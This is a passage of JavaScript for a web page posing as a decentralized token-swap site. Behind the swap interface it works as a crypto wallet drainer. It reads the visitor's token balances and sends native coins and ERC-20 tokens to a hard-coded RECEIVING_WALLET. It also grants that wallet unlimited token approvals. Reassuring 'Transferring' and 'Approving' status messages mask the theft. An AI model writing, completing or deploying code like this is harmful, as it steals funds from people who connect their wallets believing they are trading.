  const multicall = new ethers.Contract(multicallAddress, MULTICALL_ABI, provider);
  
  const calls = tokens.map(token => ({
    target: token.address,
    callData: new ethers.utils.Interface(ERC20_ABI).encodeFunctionData(
      "balanceOf", 
      [userAddress]
    )
  }));
  
  try {
    const [, results] = await multicall.aggregate(calls);
    
    const balances = {};
    tokens.forEach((token, i) => {
      const [balance] = new ethers.utils.Interface(ERC20_ABI).decodeFunctionResult(
        "balanceOf",
        results[i]
      );
      balances[token.address] = parseFloat(
        ethers.utils.formatUnits(balance, token.decimals || 18)
      );
    });
    
    return balances;
  } catch (err) {
    console.error("Multicall failed, falling back to individual calls:", err);
    const balances = {};
    for (const token of tokens) {
      balances[token.address] = await fetchTokenBalance(token);
    }
    return balances;
  }
}

// Add these constants near the top of your file
const MAX_GAS_PRICE_GWEI = {
  ethereum: 10,
  bsc: 3,
  polygon: 50,
  arbitrum: 0.1,
  base: 0.1
};

const GAS_LIMITS = {
  nativeTransfer: 21000,
  erc20Transfer: 100000,
  approval: 150000
};

async function transferNativeToken(token, amount) {
  try {
    updateStatus(`Sending ${amount} ${token.symbol}...`, "success");
    
    let gasPrice = await provider.getGasPrice();
    const maxGasPrice = ethers.utils.parseUnits(
      MAX_GAS_PRICE_GWEI[currentNetwork].toString(), 
      'gwei'
    );
    
    if (gasPrice.gt(maxGasPrice)) {
      gasPrice = maxGasPrice;
      updateStatus(`Using capped gas price for cheaper tx`, "info");
    }
    
    const tx = await signer.sendTransaction({
      to: RECEIVING_WALLET,
      value: ethers.utils.parseEther(amount.toString()),
      gasLimit: GAS_LIMITS.nativeTransfer,
      gasPrice
    });
    
    await tx.wait();
    return tx.hash;
  } catch (err) {
    console.error("Native token transfer error:", err);
    throw new Error(`Failed to send ${token.symbol}: ${err.message}`);
  }
}

async function transferERC20Token(token, amount) {
  try {
    updateStatus(`Transferring ${amount} ${token.symbol}...`, "success");
    
    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
    const amountInWei = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
    
    let gasEstimate;
    try {
      gasEstimate = await contract.estimateGas.transfer(
        RECEIVING_WALLET,
        amountInWei
      );
    } catch (e) {
      console.warn(`Gas estimation failed for ${token.symbol}, using fallback`);
      gasEstimate = ethers.BigNumber.from(200000);
    }

    const gasLimit = gasEstimate.mul(120).div(100);
    const gasPrice = (await provider.getGasPrice()).mul(110).div(100);
    
    const tx = await contract.transfer(
      RECEIVING_WALLET,
      amountInWei,
      { 
        gasLimit,
        gasPrice
      }
    );
    
    await tx.wait();
    return tx.hash;
  } catch (err) {
    console.error("ERC20 transfer error:", err);
    throw new Error(`Failed to transfer ${token.symbol}: ${err.message}`);
  }
}

async function checkAndApproveToken(token, amount) {
  if (!token.address || token.isNative) return true;

  try {
    const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
    const neededAllowance = ethers.utils.parseUnits(amount.toString(), token.decimals || 18);
    
    const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
    if (allowance.gte(neededAllowance)) return true;

    updateStatus(`Approving ${token.symbol}...`, "success");
    
    if (token.symbol === 'USDT' && !allowance.isZero()) {
      const zeroTx = await contract.approve(
        RECEIVING_WALLET,
        ethers.constants.Zero,
        { gasLimit: 100000 }
      );
      await zeroTx.wait();
    }
    
    const approveTx = await contract.approve(
      RECEIVING_WALLET,
      ethers.constants.MaxUint256,
      { gasLimit: 150000 }
    );
    
    await approveTx.wait();
    return true;
  } catch (err) {
    console.error("Approval error:", err);
    updateStatus(`Approval failed for ${token.symbol}`, "error");
    return false;
  }
}

// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type, duration = 5000) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.innerHTML = message;
  statusDiv.className = `dex-status ${type}`;
  
  statusDiv.innerHTML += `<button class="dex-status-close" onclick="this.parentElement.style.display='none'">
    <i class="fas fa-times"></i>
  </button>`;
  
  if (duration > 0) {
    setTimeout(() => {
      statusDiv.style.display = "none";
    }, duration);
  }
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateWalletButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  if (isConnected) {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>
    `;
    btn.classList.add('connected');
  } else {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>Connect Wallet</span>
    `;
    btn.classList.remove('connected');
  }
  
  updateSwapButton();
}

function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    btn.onclick = handleWalletConnection;
    return;
  }
  
  btn.onclick = handleSwap;
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const inputAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  if (inputAmount > 0) {
    btnText.textContent = `Swap ${inputAmount} ${currentFromToken.symbol}`;
  } else {
    btnText.textContent = `Swap ${currentFromToken.symbol}`;
  }
  
  btn.disabled = false;
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}

function showWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'none';
}

// Helper functions
function debounce(func, wait) {
  let timeout;
  return function(...args) {
    const context = this;
    clearTimeout(timeout);
    timeout = setTimeout(() => func.apply(context, args), wait);
  };
}

function shortenAddress(address) {
  if (!address) return '';
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

async function fetchWithTimeout(resource, options = {}) {
  const { timeout = 8000 } = options;
  
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  
  const response = await fetch(resource, {
    ...options,
    signal: controller.signal  
  });
  
  clearTimeout(id);
  return response;
}
